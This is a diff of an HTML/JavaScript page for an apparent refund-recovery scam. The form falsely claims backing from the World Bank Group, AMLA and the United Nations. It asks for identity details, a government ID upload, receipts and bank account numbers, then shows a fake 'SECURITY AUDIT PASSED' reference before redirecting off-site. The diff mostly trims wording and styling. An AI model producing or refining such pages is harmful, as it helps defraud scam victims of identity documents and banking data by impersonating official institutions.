@@ -19,6 +19,7 @@
 
         .page-wrapper { display: flex; align-items: flex-start; justify-content: center; width: 100%; max-width: 1800px; gap: 50px; padding-top: 50px; }
 
+        /* SIDE TEXTS - MISSION & VISION (OUTSIDE FORM) */
         .side-text { width: 380px; color: white; line-height: 1.6; margin-top: 150px; }
         .side-text h3 { color: var(--security-gold); text-transform: uppercase; font-size: 28px; margin-bottom: 20px; border-bottom: 3px solid var(--security-gold); display: inline-block; padding-bottom: 5px; font-weight: 900; }
         .side-text p { font-size: 18px; font-weight: 500; text-align: justify; text-shadow: 2px 2px 4px rgba(0,0,0,0.8); }
@@ -33,8 +34,7 @@
         .section-box { padding: 50px; display: none; }
         .section-box.active { display: block; }
         
-        h2 { font-size: 20px; color: var(--hamburg-blue); margin-bottom: 10px; font-weight: 800; text-transform: uppercase; }
-        .instruction-text { font-size: 13px; color: #555; margin-bottom: 25px; line-height: 1.5; border-bottom: 1px solid #eee; padding-bottom: 15px; }
+        h2 { font-size: 20px; color: var(--hamburg-blue); margin-bottom: 10px; font-weight: 800; text-transform: uppercase; border-bottom: 2px solid #eee; padding-bottom: 10px; }
         
         .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; }
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; }
@@ -47,13 +47,8 @@
         .review-label { font-size: 10px; font-weight: 800; color: var(--hamburg-blue); text-transform: uppercase; }
         .review-value { font-size: 16px; color: #333; margin-top: 5px; font-weight: 600; }
 
-        .contact-link { 
-            display: block; text-align: center; margin-top: 20px; font-weight: 900; 
-            color: #ffffff; background-color: var(--hamburg-red); text-decoration: none; 
-            font-size: 16px; text-transform: uppercase; border-radius: 4px; padding: 20px; 
-            box-shadow: 0 4px 15px rgba(225, 0, 25, 0.3); transition: 0.3s; cursor: pointer;
-        }
-        .contact-link:hover { background-color: var(--hamburg-blue); transform: translateY(-2px); }
+        .contact-link { display: block; text-align: center; margin-top: 20px; font-weight: 900; color: #ffffff; background-color: var(--hamburg-red); text-decoration: none; font-size: 16px; text-transform: uppercase; border-radius: 4px; padding: 20px; cursor: pointer; transition: 0.3s; }
+        .contact-link:hover { background-color: var(--hamburg-blue); }
 
         .btn-container { display: flex; justify-content: flex-end; margin-top: 40px; gap: 15px; }
         button { background-color: var(--hamburg-blue); color: white; border: none; padding: 20px 60px; cursor: pointer; font-size: 15px; font-weight: 900; text-transform: uppercase; }
@@ -65,10 +60,10 @@
 <body>
 
     <div class="page-wrapper">
-        <!-- MISSION -->
+        <!-- LEFT: MISSION -->
         <div class="side-text">
             <h3>MISSION</h3>
-            <p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced, multi-stage verification protocols and proactive fraud detection systems that strictly safeguard our users' assets against evolving digital scams and unauthorized access during the refund process.</p>
+            <p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced, multi-stage verification protocols and proactive fraud detection systems that strictly safeguard our users' assets against digital scams.</p>
         </div>
 
         <div class="form-container">
@@ -92,16 +87,15 @@
                         <div><label>Nationality *</label><input type="text" id="nat" class="req"></div>
                     </div>
                     <div style="margin-top:25px;"><label>Birthdate *</label><input type="text" id="bd" class="req" placeholder="MM / DD / YYYY"></div>
-                    <div style="margin-top:25px;"><label>Upload Valid Government ID *</label><input type="file" id="idFile" class="req"></div>
+                    <div style="margin-top:25px;"><label>Upload Valid Government ID *</label><input type="file" id="idU" class="req"></div>
                     <div class="btn-container"><button type="button" onclick="validate(1, 2)">NEXT STEP</button></div>
                 </div>
 
                 <!-- SECTION 2 -->
                 <div id="section2" class="section-box">
                     <h2>SECTION 2: MANDATORY REFUND VERIFICATION</h2>
-                    <p class="instruction-text">Please provide your disbursement details accurately.</p>
                     <div><label>TOTAL REFUND AMOUNT *</label><input type="text" id="amt" class="req"></div>
-                    <div style="margin-top:25px;"><label>Upload Receipt *</label><input type="file" id="receiptFile" class="req"></div>
+                    <div style="margin-top:25px;"><label>Upload Receipt *</label><input type="file" id="rcpU" class="req"></div>
                     <div style="margin-top:25px;"><label>Bank Name / App *</label><input type="text" id="bn" class="req"></div>
                     <div class="grid-2" style="margin-top:25px;">
                         <div><label>Account Number *</label><input type="text" id="an" class="req"></div>
@@ -117,10 +111,10 @@
                 <div id="section3" class="section-box">
                     <h2>SECTION 3: REVIEW INFORMATION</h2>
                     <div id="reviewDisplay"></div>
-                    <div class="contact-link" onclick="openGmail()">📧 DIRECT CONTACT THE AUTHORITY</div>
+                    <div class="contact-link" onclick="window.open('https://google.com')">📧 DIRECT CONTACT THE AUTHORITY</div>
                     <div class="btn-container">
                         <button type="button" class="btn-back" onclick="show(2)">EDIT</button>
-                        <button type="button" onclick="finalSubmit()">SUBMIT TO DATABASE</button>
+                        <button type="button" onclick="finalSubmit()">SUBMIT TO CHAT DATABASE</button>
                     </div>
                 </div>
             </form>
@@ -128,10 +122,10 @@
             <div class="establishment-footer">ESTABLISHED BY: WORLD BANK GROUP • AMLA • UNITED NATIONS<br>AUTHORIZED OPERATIONAL DATE: APRIL 20, 2025</div>
         </div>
 
-        <!-- VISION -->
+        <!-- RIGHT: VISION -->
         <div class="side-text">
             <h3>VISION</h3>
-            <p>To be recognized as the premier global benchmark for commercial integrity and consumer safety, where a culture of absolute transparency and sophisticated security ensures that every individual can navigate the refund ecosystem with unwavering confidence and total protection from deceptive practices.</p>
+            <p>To be recognized as the premier global benchmark for commercial integrity and consumer safety, where absolute transparency ensures that every individual can navigate the refund ecosystem with unwavering confidence.</p>
         </div>
     </div>
 
@@ -141,25 +135,33 @@
             document.getElementById('section' + p).classList.add('active');
             window.scrollTo(0,0);
         }
+
         function validate(curr, next) {
             const inputs = document.getElementById('section' + curr).querySelectorAll('.req');
             let ok = true;
             inputs.forEach(i => { if(!i.value) { i.classList.add('invalid'); ok = false; } else i.classList.remove('invalid'); });
             if(ok) { if(next === 3) populateReview(); show(next); }
         }
+
         function populateReview() {
             document.getElementById('reviewDisplay').innerHTML = `
-                <div class="review-item"><div class="review-label">NAME</div><div class="review-value">${document.getElementById('fn').value} ${document.getElementById('ln').value}</div></div>
+                <div class="review-item"><div class="review-label">FULL NAME</div><div class="review-value">${document.getElementById('fn').value} ${document.getElementById('ln').value}</div></div>
                 <div class="review-item"><div class="review-label">REFUND AMOUNT</div><div class="review-value">${document.getElementById('amt').value}</div></div>
                 <div class="review-item"><div class="review-label">BANK</div><div class="review-value">${document.getElementById('bn').value}</div></div>
+                <div class="review-item"><div class="review-label">VERIFICATION</div><div class="review-value">ID & Receipt Files Attached</div></div>
             `;
         }
-        function openGmail() { window.open('https://google.com', '_blank'); }
+
         function finalSubmit() {
             const ref = "REF-" + Math.floor(Math.random() * 1000000);
-            alert("SECURITY AUDIT PASSED. \nReference: " + ref);
-            window.open('https://forms.gle', '_blank');
-            document.getElementById('section3').innerHTML = `<div style="text-align:center; padding:40px;"><h2>CLAIM RECORDED</h2><p>Reference: ${ref}</p><div style="font-size:60px;">✅</div></div>`;
+            alert("SECURITY AUDIT PASSED. \nReference: " + ref + "\n\nRedirecting to Google Chat Authority...");
+            window.open('https://google.com', '_blank');
+            document.getElementById('section3').innerHTML = `
+                <div style="text-align:center; padding:40px;">
+                    <h2 style="color: var(--hamburg-blue);">SUBMISSION SUCCESSFUL</h2>
+                    <p>Reference: <strong>${ref}</strong></p>
+                    <div style="font-size:60px; margin:20px;">✅</div>
+                </div>`;
         }
     </script>
 </body>
